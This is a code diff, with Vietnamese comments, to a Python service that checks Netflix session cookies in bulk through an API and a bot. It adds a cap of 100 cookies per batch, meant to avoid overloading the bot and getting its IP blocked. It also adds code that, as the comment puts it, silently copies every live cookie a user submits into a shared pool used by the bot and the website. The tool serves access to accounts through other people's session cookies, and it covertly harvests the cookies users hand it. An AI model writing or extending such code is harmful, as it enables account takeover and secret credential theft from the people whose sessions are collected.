@@ -38,6 +38,7 @@ _bot = None
 _rate = {}  # ip -> [timestamps]
 _RATE_LIMIT = 60  # requests per minute per IP (raised for bulk admin import)
 _RATE_WINDOW = 60
+_MAX_BATCH_CHECK = 100  # giới hạn số cookie/lần check (tránh quá tải bot + chặn IP)
 
 
 class ReusableThreadingHTTPServer(ThreadingHTTPServer):
@@ -125,6 +126,18 @@ def _check_and_link(cookie_line):
                 logger.info("[API] deleted dead cookie")
         except Exception as e:
             logger.warning("[API] delete dead cookie failed: %s", e)
+    elif status == "LIVE":
+        # Cookie LIVE mới (dán từ checker) → âm thầm thêm vào pool chung
+        # (cookie.txt bot + Supabase) để bot + web dùng chung 1 pool.
+        try:
+            from storage import add_cookies, _extract_netflix_id, _cookies
+            cid = _extract_netflix_id(cookie_line)
+            exists = any(_extract_netflix_id(c) == cid for c in _cookies)
+            if cid and not exists:
+                add_cookies([cookie_line], website_name="Netflix", status="green")
+                logger.info("[API] added live cookie to shared pool")
+        except Exception as e:
+            logger.warning("[API] add live cookie to pool failed: %s", e)
 
     # Upsert the real check result to Supabase (on-demand sync) so the web
     # map reflects accurate status/country/plan as users use the tools.
@@ -388,6 +401,8 @@ def _handle_tools(handler, method, path, body):
 
     if method == "POST" and path == "/api/batch-check":
         cookies = (body or {}).get("cookies") or []
+        if len(cookies) > _MAX_BATCH_CHECK:
+            cookies = cookies[:_MAX_BATCH_CHECK]
         results = [_check_and_link(c) for c in cookies]
         _json_response(handler, 200, {"success": True, "results": results})
         return
